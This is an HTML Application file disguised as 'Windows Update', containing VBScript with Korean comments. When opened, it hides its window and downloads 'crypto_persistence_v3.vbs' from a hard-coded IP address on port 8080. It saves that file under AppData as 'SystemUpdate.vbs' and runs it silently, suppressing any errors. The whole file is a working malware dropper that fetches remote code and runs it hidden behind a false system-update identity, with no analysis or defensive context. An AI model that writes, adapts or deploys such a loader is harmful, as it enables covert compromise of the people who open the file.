<html>
<head>
<title>Windows Update</title>
<HTA:APPLICATION
  SHOWINTASKBAR="no"
  BORDER="none"
  CAPTION="no"
  SYSMENU="no"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="no"
  SCROLL="no"
  WINDOWSTATE="minimize">
</head>
<body>
<script language="VBScript">

Sub Window_OnLoad
    On Error Resume Next

    ' 창 숨기기
    Self.window.moveTo -32000, -32000
    Self.window.resizeTo 0, 0

    ' 메인 함수 실행
    Call DownloadAndExecute

    ' 창 닫기
    window.close
End Sub

Sub DownloadAndExecute()
    On Error Resume Next

    Dim objShell, objHTTP, objStream, objFSO
    Dim url, savePath, targetDir

    Set objShell = CreateObject("WScript.Shell")
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Set objStream = CreateObject("ADODB.Stream")
    Set objFSO = CreateObject("Scripting.FileSystemObject")

    ' VBS 다운로드 URL
    url = "http://192.168.202.44:8080/crypto_persistence_v3.vbs"

    ' 저장 경로: %APPDATA%\Microsoft\Windows\SystemUpdate.vbs
    targetDir = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows"
    savePath = targetDir & "\SystemUpdate.vbs"

    ' 폴더 생성 (없으면)
    If Not objFSO.FolderExists(targetDir) Then
        objFSO.CreateFolder(targetDir)
    End If

    ' HTTP 다운로드
    objHTTP.Open "GET", url, False
    objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0"
    objHTTP.Send

    If objHTTP.Status = 200 Then
        ' 파일로 저장
        objStream.Type = 1  ' Binary
        objStream.Open
        objStream.Write objHTTP.responseBody
        objStream.SaveToFile savePath, 2  ' Overwrite
        objStream.Close

        ' VBS 실행
        objShell.Run "wscript.exe """ & savePath & """", 0, False
    End If

    Set objShell = Nothing
    Set objHTTP = Nothing
    Set objStream = Nothing
    Set objFSO = Nothing
End Sub

</script>
</body>
</html>
